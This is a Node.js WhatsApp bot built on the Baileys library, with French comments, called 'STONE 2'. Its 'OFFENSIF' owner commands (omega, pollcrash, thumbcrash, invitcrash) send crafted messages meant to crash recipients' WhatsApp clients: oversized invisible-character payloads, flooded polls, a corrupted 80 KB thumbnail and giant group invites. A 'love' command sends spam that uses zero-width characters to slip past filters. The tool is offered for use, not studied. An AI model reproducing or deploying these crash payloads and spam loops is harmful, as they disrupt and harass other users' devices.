const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    makeCacheableSignalKeyStore, 
    DisconnectReason, 
    downloadMediaMessage,
    Browsers
} = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { exec, execSync } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const { Jimp } = require("jimp");
const { OpenAI } = require("openai");
const qrcode = require('qrcode-terminal');

// --- CONFIGURATION ---
const groq = new OpenAI({
    apiKey: process.env.GROQ_API_KEY || "VOTRE_CLE_ICI",
    baseURL: "https://api.groq.com/openai/v1",
});

const SESSIONS_DIR = path.join(__dirname, "sessions");
const TEMP_DIR = path.join(__dirname, "temp");
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

// --- VARIABLES ET CACHE ---
const activeSessions = new Map();
const messageCache = new Map();
const hostingStates = new Map();
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// --- FONCTIONS UTILITAIRES ---

const getInvisibleJunk = () => ["\u200B", "\u200C", "\u200D"][Math.floor(Math.random() * 3)].repeat(Math.floor(Math.random() * 10) + 1);

async function uploadToCatbox(buffer, filename) {
    const tempPath = path.join(TEMP_DIR, `up_${Date.now()}_${filename}`);
    fs.writeFileSync(tempPath, buffer);
    try {
        const cmd = `curl -F "reqtype=fileupload" -F "fileToUpload=@${tempPath}" https://catbox.moe/user/api.php`;
        return execSync(cmd).toString().trim();
    } catch (e) { return null; } finally { if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath); }
}

// --- LOGGING ---
function logMessage(botNum, remoteJid, sender, text, type) {
    console.log(`\n[${new Date().toLocaleTimeString()}] BOT: ${botNum} | DE: ${sender} (${remoteJid.split('@')[0]})`);
    console.log(`TYPE: ${type.toUpperCase()} | MSG: ${text.substring(0, 50)}${text.length > 50 ? '...' : ''}`);
}

// --- LOGIQUE PRINCIPALE ---

async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify = null) {
    const cleanNumber = phoneNumber.replace(/[^0-9]/g, "");
    const sessionPath = path.join(SESSIONS_DIR, cleanNumber);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        browser: Browsers.ubuntu('Chrome'),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
    });

    activeSessions.set(cleanNumber, { sock, isBotActive: true, activeSpams: new Set() });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) qrcode.generate(qr, { small: true });
        
        if (connection === "close") {
            const shouldReconnect = (lastDisconnect?.error instanceof Boom) && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) createBotInstance(cleanNumber);
        } else if (connection === "open") {
            console.log(`✅ [${cleanNumber}] SESSION OUVERTE`);
        }

        if (!sock.authState.creds.registered && connection === undefined) {
            try {
                const code = await sock.requestPairingCode(cleanNumber);
                console.log(`\n🔑 CODE D'APPAIRAGE [${cleanNumber}] : ${code}\n`);
                if (sockToNotify) await sockToNotify.sendMessage(jidToNotify, { text: `✅ Session : ${cleanNumber}\nCode : *${code}*` });
            } catch (e) { console.log("Erreur Pairing Code"); }
        }
    });

    sock.ev.on("messages.upsert", async (m) => {
        const msg = m.messages[0];
        if (!msg.message || msg.key.remoteJid === "status@broadcast") return;

        const remoteJid = msg.key.remoteJid;
        const isFromMe = msg.key.fromMe;
        const text = (msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || "").trim();
        const lowerText = text.toLowerCase();
        const current = activeSessions.get(cleanNumber);

        logMessage(cleanNumber, remoteJid, msg.pushName || "Inconnu", text, "msg");

        // --- COMMANDES PROPRIÉTAIRE (isFromMe) ---
        if (isFromMe) {
            
            // 1. OMEGA 2.0 (Payload Interactif)
            if (lowerText === "omega") {
                await sock.sendMessage(remoteJid, { text: "💀 *PROTOCOLE OMEGA 2.0*" });
                try {
                    await sock.sendMessage(remoteJid, {
                        viewOnceMessage: {
                            message: {
                                interactiveMessage: {
                                    header: { title: "System Error", hasMediaAttachment: false },
                                    body: { text: "⚠️ Overload: " + "\u200e".repeat(3000) },
                                    nativeFlowMessage: {
                                        buttons: [{
                                            name: "single_select",
                                            buttonParamsJson: JSON.stringify({
                                                title: "CRASH",
                                                sections: [{ title: "Lethal", rows: Array(25).fill({ title: "జ్ఞా".repeat(50), rowId: "1" }) }]
                                            })
                                        }]
                                    }
                                }
                            }
                        }
                    });
                } catch (e) { await sock.sendMessage(remoteJid, { text: "❌ Échec Omega" }); }
            }

            // 2. POLL-CRASH
            if (lowerText.startsWith("pollcrash")) {
                const count = parseInt(text.split(" ")[1]) || 5;
                for (let i = 0; i < count; i++) {
                    await sock.sendMessage(remoteJid, {
                        poll: {
                            name: "☣️ STONE 2 " + "🛑".repeat(200),
                            values: Array(12).fill("🔥".repeat(100)),
                            selectableCount: 1
                        }
                    });
                    await sleep(400);
                }
            }

            // 3. THUMB-CRASH (Miniature Corrompue)
            if (lowerText === "thumbcrash") {
                await sock.sendMessage(remoteJid, {
                    image: { url: "https://files.catbox.moe/6uhomx.png" },
                    jpegThumbnail: Buffer.alloc(80000, 'ff'),
                    viewOnce: true
                });
            }

            // 4. INVIT-CRASH
            if (lowerText === "invitcrash") {
                await sock.sendMessage(remoteJid, {
                    groupInviteMessage: {
                        groupJid: "1234@g.us",
                        inviteCode: "crash"+Date.now(),
                        groupName: "☣️".repeat(2000),
                        caption: "🔥".repeat(2000)
                    }
                });
            }

            // 5. SPAM LOVE
            if (lowerText.startsWith("love ")) {
                const args = text.split(" ");
                const word = args[1] || "Stone2";
                const count = parseInt(args[2]) || 10;
                current.activeSpams.add(remoteJid);
                for (let i = 0; i < count; i++) {
                    if (!current.activeSpams.has(remoteJid)) break;
                    await sock.sendMessage(remoteJid, { text: word + getInvisibleJunk() });
                    await sleep(200);
                }
            }

            if (lowerText === "stop") current.activeSpams.delete(remoteJid);
        }

        // --- COMMANDES PUBLIQUES ---

        if (lowerText === "menu") {
            const menu = `*STONE 2 - SYSTEM v2026*\n\n` +
                `*OFFENSIF (ADMIN)*\n` +
                `- omega (Crash UI)\n- pollcrash [nb]\n- thumbcrash\n- invitcrash\n- love [txt] [nb]\n\n` +
                `*UTILE*\n` +
                `- s (Sticker)\n- save (VV)\n- host (Lien)\n- video [nom]\n\n` +
                `*SESSIONS*\n` +
                `- connect [num] moussa`;
            await sock.sendMessage(remoteJid, { text: menu }, { quoted: msg });
        }

        if (lowerText === "s" || lowerText === "sticker") {
            const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage || msg.message;
            if (quoted.imageMessage || quoted.videoMessage) {
                const buffer = await downloadMediaMessage({ message: quoted }, "buffer", {});
                const tempFile = path.join(TEMP_DIR, `s_${Date.now()}.webp`);
                fs.writeFileSync(tempFile, buffer); // Simplification sans FFmpeg pour l'exemple
                await sock.sendMessage(remoteJid, { sticker: fs.readFileSync(tempFile) }, { quoted: msg });
                fs.unlinkSync(tempFile);
            }
        }

        if (lowerText.startsWith("connect ") && text.includes("moussa")) {
            const num = text.split(" ")[1].replace(/[^0-9]/g, "");
            createBotInstance(num, sock, remoteJid);
        }
    });
}

createBotInstance("16062620863"); // Remplacez par votre numéro principal
